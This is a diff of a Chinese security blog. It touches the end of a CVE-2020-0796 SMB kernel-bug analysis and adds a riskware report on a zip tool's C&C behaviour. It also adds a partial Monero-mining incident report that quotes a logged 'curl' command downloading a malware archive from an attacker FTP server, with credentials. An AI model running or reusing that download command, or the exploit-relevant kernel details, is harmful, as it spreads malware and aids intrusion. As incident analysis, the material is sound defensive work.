+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.png" alt="img"></p>
 <center>图 8</center>
 
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.png" alt="img"></p>
 <center>图 9</center>
 
 <p>在图8和9中，IDA Pro显示RtlDecompressBufferXpressLz函数是一个300多行伪代码的复杂函数。</p>
@@ -666,10 +678,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FOLLOWUP_IP:</span><br><span class="line">nt!RtlDecompressBufferXpressLz+2d</span><br><span class="line">0fffff800&#96;4575e3c0 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]</span><br><span class="line"></span><br><span class="line">FAULT_INSTR_CODE:  c085a4f3</span><br><span class="line">SYMBOL_STACK_INDEX:  7</span><br><span class="line">SYMBOL_NAME:  nt!RtlDecompressBufferXpressLz+2d0</span><br><span class="line">FOLLOWUP_NAME:  MachineOwner</span><br><span class="line">MODULE_NAME: nt</span><br><span class="line">IMAGE_NAME:  ntkrnlmp.exe</span><br><span class="line">DEBUG_FLR_IMAGE_TIMESTAMP:  0</span><br><span class="line">STACK_COMMAND:  .thread ; .cxr ; kb</span><br><span class="line">BUCKET_ID_FUNC_OFFSET:  2d0</span><br><span class="line">FAILURE_BUCKET_ID:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br><span class="line">BUCKET_ID:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br><span class="line">PRIMARY_PROBLEM_CLASS:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br></pre></td></tr></table></figure>
 
 <p>太棒了，我们和WinDBG达成了共识。它直接提示可能是nt!RtlDecompressBufferXpressLz+2d0处出了问题。</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.png" alt="img"></p>
 <center>图 10</center>
 
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.png" alt="img"></p>
 <center>图 11</center>
 
 <p>如图10和11所示，现在我们了解到nt!RtlDecompressBufferXpressLz+2d0处是一个内存复制函数qmemcpy。这符合往常的漏洞构成的元素。</p>
@@ -697,12 +709,12 @@
 
 <p>在qmemcpy函数执行后，我们发现ffffe402ec9f5280处的_POOL_HEADER确实被写入了数据。</p>
 <h3 id="3-2-复制数据的大小"><a href="#3-2-复制数据的大小" class="headerlink" title="3.2 复制数据的大小"></a>3.2 复制数据的大小</h3><p>现在我们需要搞明白，复制数据大小和目的地址的来源。</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.png" alt="img"></p>
 <center>图 12</center>
 
 <p>经过类似的断点和调试，我们在nt!RtlDecompressBufferXpressLz+0x2AA处，观察到qmemcpy中的count数据来自于RtlDecompressBufferXpressLz收到的参数CompressedBuffer的最后4个字节与3之和（图12所示）。因此操作压缩数据末尾的4个字节，可以控制复制数据的大小。</p>
 <p>复制数据大小的来源已经清楚了，就剩下最后一个谜团–目的地址的来源。</p>
-<h3 id="3-3-目的地址的来源"><a href="#3-3-目的地址的来源" class="headerlink" title="3.3 目的地址的来源"></a>3.3 目的地址的来源</h3><p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.png" alt="img"></p>
+<h3 id="3-3-目的地址的来源"><a href="#3-3-目的地址的来源" class="headerlink" title="3.3 目的地址的来源"></a>3.3 目的地址的来源</h3><p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.png" alt="img"></p>
 <center>图 13</center>
 
 <p>我们根据设置的WinDBG断点日志，整理了图13所示的函数调用及数据传递过程。也顺便介绍前文所述的如何通过公开的文档、符号文件或者数据流，注解IDA Pro函数名或者变量名，使得显示更加友好，以便开展分析工作。入手点是<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbufferex2查阅到的关于RtlDecompressBufferEx2的定义或NT之前泄露的源码中的相关函数定义。" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbufferex2查阅到的关于RtlDecompressBufferEx2的定义或NT之前泄露的源码中的相关函数定义。</a></p>
@@ -710,12 +722,12 @@
 <p>Srv2DecompressData+0x85处的ExAllocatePoolWithTag() 返回值是0xffffa28f92503000，位于UncompressedBuffer之后0x370CBC8的位置。</p>
 <p>即qmemcpy写入数据大小范围内有其他的Pool块时，将会导致ExFreePoolWithTag()时出错。</p>
 <h3 id="3-4-任意地址写入"><a href="#3-4-任意地址写入" class="headerlink" title="3.4 任意地址写入"></a>3.4 任意地址写入</h3><p>如果size大小合适或者其范围内没有在用的Pool块，如0x1100+0n24大小时，则会有下述情况：</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.png" alt="img"></p>
 <center>图 14</center>
 
 <p>我们根据相关函数调用，绘制了图14所示的内存布局图。</p>
 <p>当srv2!Srv2DecompressData+0x79处 SrvNetAllocateBuffer((unsigned int)(hdr.OriginalCompressedSegmentSize + offset)申请内存时，返回值设定AllocateBuf，简称A点。B点至U点正是SMB协议头中的offset值0x03e8(0n1000)。</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.png" alt="img"></p>
 <center>图 15</center>
 
 <p>OriginalCompressedSegmentSize值（图15中Wireshark所示的OriginalSize）过大，与offset相加导致整数溢出。最终申请了一个较小的内存。即B点至A点的内存。内存的起始地址被写在AllocateBuf+0n24的P点。</p>
@@ -744,6 +756,604 @@
 <li><p>对于较复杂的执行流程，从最终的数据，如何便捷的向前溯源过往有关分支？有点类似反向污点数据追踪。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开发一个WinDBG插件若RIP不等于预期的地址，就不断的输出当前指令及寄存器状态到日志</span><br></pre></td></tr></table></figure></li>
 </ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="stxletto">
+      <meta itemprop="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="深澜深蓝">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" class="post-title-link" itemprop="url">关于可疑域名exrnybuf.cn的溯源分析报告</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-16 08:00:00" itemprop="dateCreated datePublished" datetime="2019-09-16T08:00:00+08:00">2019-09-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-05 23:19:38" itemprop="dateModified" datetime="2020-05-05T23:19:38+08:00">2020-05-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="关于可疑域名exrnybuf-cn的溯源分析报告"><a href="#关于可疑域名exrnybuf-cn的溯源分析报告" class="headerlink" title="关于可疑域名exrnybuf.cn的溯源分析报告"></a>关于可疑域名exrnybuf.cn的溯源分析报告</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2019年09月16日，stxletto检测到一起指向exrnybuf.cn的可疑域名访问事件。从捕获的流量数据初步来看，属于伪装成GIF文件下载的C&amp;C行为。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-1.jpg" alt="图-1"></p>
+<p>在终端EDR反馈的信息中，</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-2.jpg" alt="图-2"></p>
+<p>发现可疑的请求来自C:\Windows\Explorer.EXE进程。通过函数调用栈，我们追溯到一个动态链接库文件JZipMenu64.dll。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-3.jpg" alt="图-3"></p>
+<p>通过JZipMenu64.dll所在路径，我们在关联到多个可疑进程。JYTool.exe和JYCheck.exe在VirusTotal上1/68的恶意样本检出率。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-4.jpg" alt="图-4"></p>
+<p>同时也发现了可疑的注册表项。</p>
+<p>进一步分析，带有数字签名的PE文件JZipMenu64.dll。</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>JZipMenu64.dll</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>大小</td>
+<td>773,016 字节</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>87e110a5ca39a6b6afec3788577c9622</td>
+</tr>
+<tr>
+<td>SHA256</td>
+<td>eb6c95e43c458ca300041ce452b18ff5b5a84b1711ba5e3f260216d8961c3565</td>
+</tr>
+<tr>
+<td>数字签名</td>
+<td>Shanghai Shen Wei Wang  Luo Ke Ji You Xian Gong Si（有效期2018/04/11~2019/04/12）</td>
+</tr>
+</tbody></table>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-5.jpg" alt="图-5"><br>JZipMenu64.dll是Winds平台下的shell扩展动态库，负责用户在右键点击时，显示解压菜单。<br>但分析显示在其DllMain中加载动态库后会自动执行的4处可疑代码块。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-6.jpg" alt="图-6"><br>1）使用GetPrivateProfileStringW获取main.ini中的配置。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-7.jpg" alt="图-7"><br>2）检测宿主进程名是否为main.ini中sys节Exp变量设定的进程名一致，不一致则退出执行流程。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-8.jpg" alt="图-8"><br>3）创建名为“jianya_dothing_mutex”的mutex，以实现执行实例唯一性。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-9.jpg" alt="图-9"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-10.jpg" alt="图-10"><br>4）创建新线程执行JYCheck.exe及获取config.db文件（即前文所述的GIF文件）。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-11.jpg" alt="图-11"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-12.jpg" alt="图-12"></p>
+<p>JYCheck.exe访问的URL。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-13.jpg" alt="图-13"></p>
+<p>主要用于流量统计。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-14.jpg" alt="图-14"></p>
+<p>2.0版本的GIF路径。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-15.jpg" alt="图-15"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-16.jpg" alt="图-16"><br>从特定的URL下载文件到本地的临时目录C:\Users\xx\AppData\Local\Temp\JY\config.db</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-17.jpg" alt="图-17"><br>经分析config.db是经过base64编码的配置文件。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-18.jpg" alt="图-18"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-19.jpg" alt="图-19"><br>Unicode转化</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-20.jpg" alt="图-20"><br>Base64解码</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-21.jpg" alt="图-21"><br>经Unicode转化、Base64解码、zip解压后即可得其明文文本。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-22.jpg" alt="图-22"><br>路径为C:\Users\Administrator\AppData\Roaming\JYZip\main.ini的配置文件。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-23.jpg" alt="图-23"><br>JYTool.exe通过传递的命令行参数（mini、news、tips、appupdui），执行对应ini文件中的块的配置。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-24.jpg" alt="图-24"></p>
+<p>值得特别注意的是notexc字段指定的进程名列表，是常见的抓包、分析、调试、安全等软件，notextip是若干地区的ip。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-25.jpg" alt="图-25"><br><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-26.jpg" alt="图-26"></p>
+<p>当jianya_appupdui.exe读取这些配置时，就会根据配置决定是否继续执行流程。</p>
+<p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-27.jpg" alt="图-27"></p>
+<p>Exe字段是静默推广安装的9款软件。当然其所有者可以在远程服务器的配置文件分发任意载荷。<br>另外，考虑其获取C&amp;C配置的协议、压缩\加密方式，也容易被劫持并下发任意推广安装指令。</p>
+<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p><img src="/2019/09/16/%E5%85%B3%E4%BA%8E%E5%8F%AF%E7%96%91%E5%9F%9F%E5%90%8Dexrnybuf.cn%E7%9A%84%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-28.jpg" alt="图-28"><br>综上所述，从在系统中持久化存在方式、获取配置文件方式、对抗分析的方式及核心功能实现上来看，“简压”是一款对7-zip进行过度商业包装的风险软件。不建议企业客户使用。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="stxletto">
+      <meta itemprop="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="深澜深蓝">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" class="post-title-link" itemprop="url">关于一宗门罗币挖矿安全事件的分析报告</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-08 08:00:00" itemprop="dateCreated datePublished" datetime="2019-08-08T08:00:00+08:00">2019-08-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-05 23:05:13" itemprop="dateModified" datetime="2020-05-05T23:05:13+08:00">2020-05-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="关于一宗门罗币挖矿安全事件的分析报告"><a href="#关于一宗门罗币挖矿安全事件的分析报告" class="headerlink" title="关于一宗门罗币挖矿安全事件的分析报告"></a>关于一宗门罗币挖矿安全事件的分析报告</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2019年08月08日，我们检测到一起利用SSH口令爆破感染、XHide隐藏伪装恶意程序进程、IRC服务作为C&amp;C的门罗币挖矿事件。从捕获的多个样本来看，7月份的样本较5月份的样本，增加了内网SSH弱口令爆破的横向渗透模块，更具危害性。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-1.jpg" alt="图-1"></p>
+<p>事件攻击流程图</p>
+<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>通过终端EDR反馈的定时任务和CPU资源占用情况，我们在/var/tmp/路径下发现9个可疑文件，并有一个以空格做为名称的文件夹。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-2.jpg" alt="图-2"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-3.jpg" alt="图-3"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-4.jpg" alt="图-4"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-5.jpg" alt="图-5"></p>
+<p>在日志系统中发现的异常命令（curl -O <a href="ftp://noji:noji2012@153.122.137.67/.kde/olduser.tgz；因此初步判定，系统遭遇网络恶意脚本攻击">ftp://noji:noji2012@153.122.137.67/.kde/olduser.tgz</a>）</p>
+<p>我们在指定的FTP服务器上追溯到olduser.taz和scn.db两个gzip\tar文件。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-6.jpg" alt="图-6"><br>olduser.taz内有go、i686、x86_64共3个文件。</p>
+<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-7.jpg" alt="图-7"><br>经分析，olduser中的模块主要实现挖矿功能。</p>
+<p>scn.db内有6个文件。</p>
